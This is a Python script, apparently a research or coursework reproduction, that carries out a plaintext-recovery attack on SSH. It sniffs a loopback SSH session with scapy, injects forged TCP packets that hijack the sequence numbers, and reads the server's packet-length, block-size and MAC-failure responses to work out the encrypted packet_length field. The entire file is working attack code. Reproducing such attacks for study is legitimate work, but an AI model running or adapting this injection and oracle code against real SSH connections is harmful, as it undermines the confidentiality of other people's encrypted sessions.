#!/usr/bin/python
"""
Adapted from an outline authored by Camil Staps
"""
import pdb
from pexpect import pxssh
import thread
import scapy
import time
import sys
import commands

from scapy.all import IP, TCP

iface='lo' # loopback interface naming
bob = '127.0.0.1'
alice = '127.0.0.2'

def sniff_ssh_conversation(port):
    """
    Sniff the conversation between alice and bob and return the last
    SSH request/response pair.
    """
    packets = scapy.all.sniff(iface=iface, timeout=2, filter="tcp port %d"%port)
    packets = [p[IP] for p in packets if len(p[TCP]) > 4*p[TCP].dataofs]

    an = 0
    for p in reversed(packets):
        if p.src == bob and p.dst == alice:
            req = p
            an = req[TCP].ack
            break
    else:
        raise IndexError("Request packet not found")

    for p in reversed(packets):
        if p.src == alice and p.dst == bob and p[TCP].seq == an:
            res = p
            break
    else:
        raise IndexError("Response packet not found")

    return req, res

def delayed(func):
    """
    Execute func one second late.
    """
    def wrapper(*args, **kwds):
        time.sleep(1)
        return func(*args, **kwds)
    wrapper.__doc__ = func.__doc__
    return wrapper

@delayed
def generate_ssh_traffic(s):
    s.send("a")

def got_invalid_packet_length(response):
    """
    Return True if the packet list has a payload packet (i.e. it is
    neither only an ACK nor a FIN). We then assume that the packet
    contains an SSH error message which could either be a
    packet_length failure or a MAC failure which we ignore.
    """
    for (a,b) in response:
        if len(b[TCP]) > b[TCP].dataofs*4:
            return True
    return False

def has_blocksize_failure(response):
    """
    Return True if packet list contains a FIN and no 'size failure'
    packet.
    """
    if got_invalid_packet_length(response):
        return False
    for (a,b) in response:
        if (b[TCP].flags & 1):
            return True
    return False

def is_wait_state(response):
    """
    Return True if neither has_blocksize_failure nor
    got_invalid_packet_length is True.
    """
    return not got_invalid_packet_length(response) and not has_blocksize_failure(response)

def get_port_number():
    """
    Get port number of current SSH session using 'netstat'.
    """
    for line in commands.getoutput("netstat -tn").splitlines():
        if alice + ":22" in line and "ESTABLISHED" in line:
            src = [e for e in line.split(' ') if e != ''][3]
            return int(src.split(":")[1])

def ssh_attack():
    i = -1
    while True:
        i+=1
        sys.stdout.flush()

        # 1. start a fresh SSH session
        s = pxssh.pxssh()

	## REDACTED LOGIN INFORMATION
        s.login(alice, "", "")
	port = 22;

        # 2.1. generate some traffic
        thread.start_new_thread(generate_ssh_traffic, (s,))

        # 2.2. sniff data & inject
        try:
            a, b = sniff_ssh_conversation(port)
            c = gen_packet(b)

            result = scapy.all.sr(c, iface=iface, verbose=False, timeout=1, multi=True)
        except IndexError:
            s.send("\n")
            s.logout()
            s.close()
            print "Crap, something went wrong."
            continue

        # 3. check the response from the server
	print("checking response")
        response = result[0]

        if got_invalid_packet_length(response):
            # TODO: We ignore MAC Failures here.
            print "%5d: packet_length < 1 + 4 || packet_length > 256 * 1024"%(i,)
            continue
        elif has_blocksize_failure(response):
            print "%5d: need %% block_size != 0"%(i)
            continue
        elif is_wait_state(response):
            print "%5d: buffer_len(&input) < need + maclen "%(i,),
            for (a,b) in response:
                if is_ack(b):
                    break
            try:
                return handle_wait_state(b, port)
            except PacketLengthUnlikely:
                continue
        else:
            raise RuntimeError("This case should never happen",response,s)
    return s

def gen_packet(p, size=16):
    """
    Generate an SSH package which replies to p.
    """
    a = IP()
    a.src = p[IP].dst
    a.dst = p[IP].src

    b = TCP()
    b.sport = p[TCP].dport
    b.dport = p[TCP].sport

    b.seq = p[TCP].ack
    b.ack = p[TCP].seq + len(p[TCP]) - (p[TCP].dataofs*4)

    timestamp = p[TCP].options[2][1]
    b.flags = 0x18 # PA
    b.options = [('NOP', None), ('NOP', None), ('Timestamp', (timestamp[1]+100, timestamp[0]))]
    b.payload = '0'*size
    return a/b

def is_ack(p):
    return p[IP].proto == 6 and len(p[TCP]) == p[TCP].dataofs*4 and p[TCP].flags & 16

class PacketLengthUnlikely(Exception):
    """
    Raised if the value in the packet length field is unlikely,
    i.e. it is very small.
    """
    pass

class MACFailure(Exception):
    """
    Raised if we see a MAC failure on the wire.
    """
    pass

last = None

def wait_state_callback(pkt):
    """
    Called on every packet on the wire.
    """
    global last

    if is_ack(pkt) and pkt[TCP].seq == last[TCP].ack:
        # We received an ACK for our last SSH request, so we send
        # another one. However, the TCP stack (in the kernel) might
        # send out ACKs before SSH got a chance to reply with an SSH
        # connection teardown, since computing a MAC for a long
        # message takes time. We have two strategies to deal with
        # that:

        # Strategy 1: We send packets that are too small. So if we
        # send to many we know how many were too much. To enable this,
        # set the second parameter to something < 16.

        pkt = gen_packet(pkt,16)
        last = pkt

        # Strategy 2: We slow ourselves down here.
        #time.sleep(0.05)

        scapy.all.send(pkt, verbose=False)
        return

    elif len(pkt[TCP]) > (pkt[TCP].dataofs*4):
        # We received a payload and assume a MAC failure.
        raise MACFailure(pkt)
    else:
        # Something wrong happened, this should never happen.
        raise TypeError("Unknown response", pkt)

def handle_wait_state(pkt, port):
    """
    We send small packets until we receive a MAC failure. The sending
    is done via a callback only the initial packet is sent in this
    function. We keep track of the sent packets via the sequence
    numbers of TCP.
    """
    global last

    pkt = gen_packet(pkt)
    last = pkt
    first_seq = int(pkt[TCP].seq)

    thread.start_new_thread(delayed(scapy.all.send), (pkt,))

    try:
        scapy.all.sniff(iface=iface, filter="src host %s && tcp port %d"%(alice,port,), prn=wait_state_callback)
    except MACFailure, pkt:
        return calc_packet_length(pkt.message, first_seq)

def calc_packet_length(pkt, first_seq):
    """
    Given a MAC failure message and a first sequence number calculate
    the correct number of bytes sent and thereby the value of the
    packet_length field.
    """
    packet_length = pkt[TCP].ack - first_seq

    packet_length -= packet_length % 16

    packet_length += 16 # account bytes sent initially

    packet_length -= 4  # don't count the packet_length field itself
    packet_length -= 16 # don't count the MAC

    return packet_length

